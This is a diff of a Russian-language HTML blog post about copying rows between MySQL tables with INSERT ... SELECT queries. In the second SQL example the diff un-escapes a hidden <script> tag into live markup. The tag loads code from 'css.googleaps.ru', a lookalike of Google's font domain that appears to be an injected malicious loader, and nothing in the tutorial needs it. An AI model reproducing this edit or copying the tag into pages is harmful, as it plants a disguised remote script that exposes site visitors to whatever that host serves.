@@ -24,14 +24,14 @@ comments: []
 <p>Копирование полностью всех данных из одной таблицы mysql в другую:</p>
 <pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to`<br />
 SELECT *<br />
-FROM `db`.`table_from` ;<&#47;pre><br />
+FROM `db`.`table_from` ;</pre><br />
 Если необходимо скопировать только некоторые столбцы, то применяем следующую конструкцию:</p>
 <pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to` (`t1_2`, `t2_2`, `t3_2`, `t4_2`)<br />
 SELECT `t1`, `t2`, `t3`, `t4`<br />
-FROM `db`.`table_from` ;<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+FROM `db`.`table_from` ;<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre><br />
 Для копирования данных из одной таблицы MySQL в другую по условию, можно использовать следующий запрос:</p>
 <pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to` (`t1_2`, `t2_2`, `t3_2`, `t4_2`)<br />
 SELECT `t1`, `t2`, `t3`, `t4`<br />
 FROM `db`.`table_from`<br />
-WHERE `t2` < &#039;2010-07-01 11:37:38&#039;;<&#47;pre><br />
+WHERE `t2` < &#039;2010-07-01 11:37:38&#039;;</pre><br />
 &nbsp;</p>
